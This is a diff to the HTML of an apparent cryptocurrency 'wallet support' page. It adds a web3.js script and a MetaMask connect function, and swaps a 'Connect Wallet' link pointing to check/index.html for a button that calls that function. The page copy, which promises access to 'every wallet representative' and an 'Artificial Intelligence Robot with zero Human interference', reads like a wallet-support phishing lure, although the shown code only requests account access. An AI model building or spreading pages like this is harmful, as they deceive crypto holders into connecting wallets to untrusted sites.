@@ -32,6 +32,21 @@
     <link rel="stylesheet" id="stm-stmicons-css" href="assets/stm_fonts/stmicons/stmicons.css" type="text/css" media="all" />
     <link href="npm/select2_4.1.0-rc.0/dist/css/select2.min.css" rel="stylesheet" />
     <link href="ajax/libs/toastr_js/latest/css/toastr.min.css" rel="stylesheet" /> 
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.7.4-rc.1/web3.min.js"></script>
+<script>
+/* To connect using MetaMask */
+async function connect() {
+ if (window.ethereum) {
+ 
+  await window.ethereum.request({ method: "eth_requestAccounts" });
+  window.web3 = new Web3(window.ethereum);
+  
+ } else {
+  console.log("No wallet");
+ }
+}
+</script>
     <!-- paste tawk.to code below -->
 
 </head>
@@ -97,7 +112,7 @@ mr
                             <p class="desc heading-L">It is an online server which gets you across to every wallet representative to enable effective complain and rectification of issues.</h3>
                             <p class="desc heading-L">You will be on a chat with an Artificial Intelligence Robot with zero Human interference.</h3>
                             <div class="action">
-                                <button href="check/index.html" class="btn-primary-1 btn-hero heading-SB connectBtn"  id="connectBtn"><a style="color: white;" href="check/index.html">Connect Wallet</a></button>
+                                <input type="button" value="Connect Wallet" onclick="connect();">
                                 
                                 <div class="btn-hero heading-SB" id="slect-main">
                                     <select class="select2-hidden-accessible select2" id="select2-main" aria-invalid="false" data-select2-id="select2-data-1-x6av" tabindex="-1" aria-hidden="true">
